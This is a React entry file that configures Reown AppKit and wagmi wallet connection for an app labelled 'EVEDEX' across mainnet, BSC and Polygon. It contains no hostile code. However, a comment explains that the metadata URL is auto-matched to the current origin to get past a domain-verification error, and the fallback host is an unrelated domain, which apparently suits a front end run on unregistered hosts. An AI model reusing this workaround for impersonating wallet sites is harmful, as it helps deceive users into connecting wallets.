import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

const queryClient = new QueryClient();
const projectId = '7a9898896e62061904fbceeb9d296eb1';
const networks = [mainnet, bsc, polygon];

const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true
});

createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'EVEDEX',
    description: 'Terminal',
    // AUTO-MATCH DOMAIN TO PREVENT APKT002 ERROR
    url: typeof window !== 'undefined' ? window.location.origin : 'https://rpc-portal.site',
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true,
    socials: ['google', 'apple'],
    swaps: true
  }
});

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <WagmiProvider config={wagmiAdapter.wagmiConfig}>
    <QueryClientProvider client={queryClient}>
      <App />
    </QueryClientProvider>
  </WagmiProvider>
);
